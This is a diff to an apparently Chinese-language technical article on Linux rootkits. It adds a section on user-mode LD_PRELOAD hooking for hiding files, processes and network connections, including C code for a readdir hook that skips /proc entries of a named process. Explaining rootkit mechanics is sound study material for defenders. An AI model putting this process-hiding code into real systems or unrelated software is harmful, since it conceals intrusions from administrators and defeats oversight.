@@ -180,6 +180,52 @@ gcc<span class="w"> </span>-o<span class="w"> </span>test_program<span class="w"
 <div class="highlight"><pre><span></span><code>Intercepted<span class="w"> </span>call<span class="w"> </span>to<span class="w"> </span>puts<span class="w"> </span>with<span class="w"> </span>argument:<span class="w"> </span>Hello,<span class="w"> </span>World!
 Hello,<span class="w"> </span>World!
 </code></pre></div>
+<p>文件隐藏</p>
+<div class="highlight"><pre><span></span><code>HOOK open、opendir、readdir等函数， 隐藏特定文件名
+</code></pre></div>
+<p>进程隐藏</p>
+<div class="highlight"><pre><span></span><code>HOOK ps、top等命令相关的函数调用， 通常HOOK readdir、getdents函数来隐藏特定进程
+</code></pre></div>
+<p>这段代码是一个自定义的 readdir 函数，用于过滤特定进程的目录项。主要功能如下：</p>
+<ul>
+<li>初始化原始 readdir 函数指针。</li>
+<li>进入循环读取目录项。</li>
+<li>如果目录为 /proc 且进程名匹配，则跳过该目录项。</li>
+<li>返回非过滤的目录项。</li>
+</ul>
+<div class="highlight"><pre><span></span><code>struct<span class="w"> </span>dirent*<span class="w"> </span>readdir<span class="o">(</span>DIR<span class="w"> </span>*dirp<span class="o">)</span><span class="w">                                       </span>
+<span class="o">{</span><span class="w">                                                                       </span>
+<span class="w">    </span><span class="k">if</span><span class="o">(</span>original_##readdir<span class="w"> </span><span class="o">==</span><span class="w"> </span>NULL<span class="o">)</span><span class="w"> </span><span class="o">{</span><span class="w">                                    </span>
+<span class="w">        </span>original_##readdir<span class="w"> </span><span class="o">=</span><span class="w"> </span>dlsym<span class="o">(</span>RTLD_NEXT,<span class="w"> </span><span class="c1">#readdir);               </span>
+<span class="w">        </span><span class="k">if</span><span class="o">(</span>original_##readdir<span class="w"> </span><span class="o">==</span><span class="w"> </span>NULL<span class="o">)</span><span class="w">                                  </span>
+<span class="w">        </span><span class="o">{</span><span class="w">                                                              </span>
+<span class="w">            </span>fprintf<span class="o">(</span>stderr,<span class="w"> </span><span class="s2">"Error in dlsym: %s\n"</span>,<span class="w"> </span>dlerror<span class="o">())</span><span class="p">;</span><span class="w">         </span>
+<span class="w">        </span><span class="o">}</span><span class="w">                                                               </span>
+<span class="w">    </span><span class="o">}</span><span class="w">                                                                   </span>
+
+<span class="w">    </span>struct<span class="w"> </span>dirent*<span class="w"> </span>dir<span class="p">;</span><span class="w">                                                 </span>
+
+<span class="w">    </span><span class="k">while</span><span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="w">                                                            </span>
+<span class="w">    </span><span class="o">{</span><span class="w">                                                                   </span>
+<span class="w">        </span><span class="nv">dir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>original_##readdir<span class="o">(</span>dirp<span class="o">)</span><span class="p">;</span><span class="w">                                 </span>
+<span class="w">        </span><span class="k">if</span><span class="o">(</span>dir<span class="o">)</span><span class="w"> </span><span class="o">{</span><span class="w">                                                       </span>
+<span class="w">            </span>char<span class="w"> </span>dir_name<span class="o">[</span><span class="m">256</span><span class="o">]</span><span class="p">;</span><span class="w">                                         </span>
+<span class="w">            </span>char<span class="w"> </span>process_name<span class="o">[</span><span class="m">256</span><span class="o">]</span><span class="p">;</span><span class="w">                                     </span>
+<span class="w">            </span><span class="k">if</span><span class="o">(</span>get_dir_name<span class="o">(</span>dirp,<span class="w"> </span>dir_name,<span class="w"> </span>sizeof<span class="o">(</span>dir_name<span class="o">))</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w">        </span>
+<span class="w">                </span>strcmp<span class="o">(</span>dir_name,<span class="w"> </span><span class="s2">"/proc"</span><span class="o">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w">                       </span>
+<span class="w">                </span>get_process_name<span class="o">(</span>dir-&gt;d_name,<span class="w"> </span>process_name<span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w">          </span>
+<span class="w">                </span>strcmp<span class="o">(</span>process_name,<span class="w"> </span>process_to_filter<span class="o">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">{</span><span class="w">         </span>
+<span class="w">                </span><span class="k">continue</span><span class="p">;</span><span class="w">                                               </span>
+<span class="w">            </span><span class="o">}</span><span class="w">                                                           </span>
+<span class="w">        </span><span class="o">}</span><span class="w">                                                               </span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span><span class="w">                                                          </span>
+<span class="w">    </span><span class="o">}</span><span class="w">                                                                   </span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>dir<span class="p">;</span><span class="w">                                                         </span>
+<span class="o">}</span>
+</code></pre></div>
+<p>网络连接隐藏</p>
+<div class="highlight"><pre><span></span><code>HOOK netstat命令的相关函数调用， 一般会HOOK readdir/getdents来隐藏特定端口的连接
+</code></pre></div>
 <h4>内核态可装载内核模块（LKM）</h4>
 <p>内核态的rootkit主要是可装载内核模块（LKM）实现， 主要是修改操作系统的核心部分，修改内部的数据结构或者进行系统函数HOOK。那么我们就聚焦关注两个点：修改哪些数据结构， 怎么HOOK与HOOK哪些函数。</p>
 <h5>修改哪些数据结构</h5>
